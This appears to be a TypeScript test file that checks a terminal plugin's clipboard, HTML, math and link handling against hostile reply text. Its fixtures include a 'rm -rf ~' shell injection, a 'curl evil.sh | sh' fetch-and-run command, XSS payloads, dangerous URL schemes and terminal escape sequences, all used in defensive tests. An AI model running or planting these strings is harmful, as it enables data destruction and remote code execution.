import { expect, test } from 'claude-code/testing'

import type { ClipboardBackend } from '../hooks/clipboard'
import { clipboardCommand } from '../hooks/clipboard'
import { tableHtml } from '../hooks/html'
import { mathOf } from '../hooks/latex'
import type { Block } from '../hooks/markdown'
import { parse } from '../hooks/markdown'

const HOSTILE = [
  `'; do shell script "rm -rf ~" --`,
  '"; $(curl evil.sh | sh); `id` \\',
  '</script><script>alert(1)</script>',
  '\u001b]52;c;cHduZWQ=\u0007\u001b[2J',
  'line\r\nbreak\u0000nul',
  'שלום ‮gnp.exe',
]

const reply = (text: string) => ({ plugin: 'prismantis', component: 'AssistantMessage' as const, props: { text, isFirstOfReply: true }, viewport: { columns: 120, rows: 40 }, surface: 'terminal' as const })

const blockOf = (source: string, kind: Block['kind']) => parse(source, { numbers: false, paths: false }).find(b => b.kind === kind)!

test('reply text reaches the clipboard helpers only through stdin, never their argv', () => {
  for (const backend of ['macos', 'linux', 'windows'] as ClipboardBackend[]) {
    const plain = clipboardCommand(backend, '<b>a</b>', 'a', 'C:\\Windows')
    for (const bad of HOSTILE) {
      const command = clipboardCommand(backend, bad, bad, 'C:\\Windows')
      expect(command.argv).toEqual(plain.argv)
      const back = JSON.parse(command.stdin) as { html: string; text: string }
      expect(back.html).toBe(bad)
      expect(back.text).toBe(backend === 'windows' ? bad.replace(/\r?\n/g, '\r\n') : bad)
    }
  }
})

test('table html escapes hostile cells and keeps only web links', () => {
  const html = tableHtml(blockOf(`| a | b |\n|---|---|\n| </td><script>x()</script> | [go](javascript:alert(1)) |\n| <img src=x onerror=y()> | [f](file:///etc/passwd) |`, 'table') as Extract<Block, { kind: 'table' }>)
  expect(html).not.toMatch(/<script|<img|javascript:|file:/i)
  expect(html).toContain('&lt;script&gt;')
})

test('a formula reaches the math renderer as one stdin line', () => {
  const tex = mathOf(blockOf('```math\nx^2\n\\\\ y\n\ninjected\n```', 'code'))
  expect(tex).not.toBeNull()
  expect(tex).not.toContain('\n')
})

test('terminal control sequences in a reply are never drawn', async $ => {
  const bad = '\u001b]8;;file:///etc/passwd\u0007x\u001b]8;;\u0007 \u001b[2J \u001b]52;c;cHduZWQ=\u0007 \u009b31m'
  const ui = await $.ui.mount(reply(`hi ${bad}\n\n| a |\n|---|\n| ${bad} |\n\n> ${bad}\n\n- ${bad}\n\n\`\`\`bash\necho ${bad}\n\`\`\``))
  const texts = (await ui.findAll({ type: 'Text' })).map(n => n.text ?? '')
  expect(texts.length).toBeGreaterThan(4)
  expect(texts.filter(t => /[\u001b\u0007\u009b]/.test(t))).toEqual([])
})

test('only web links in a reply are clickable, in every block', async $ => {
  const links = '[ok](https://a.dev) [a](smb://host/share) [b](file:///Applications/Calculator.app) [c](ms-msdt:/id) [d](javascript:alert(1))'
  const ui = await $.ui.mount(reply(`${links}\n\n> ${links}\n\n> [!NOTE]\n> ${links}\n\n- x\n  - ${links}\n\n| a |\n|---|\n| ${links} |\n\nn[^a]\n\n[^a]: ${links}`))
  const hrefs = (await ui.findAll({ type: 'Link' })).map(l => String(l.props.href))
  expect(hrefs.length).toBe(6)
  expect(hrefs.filter(h => h !== 'https://a.dev')).toEqual([])
})
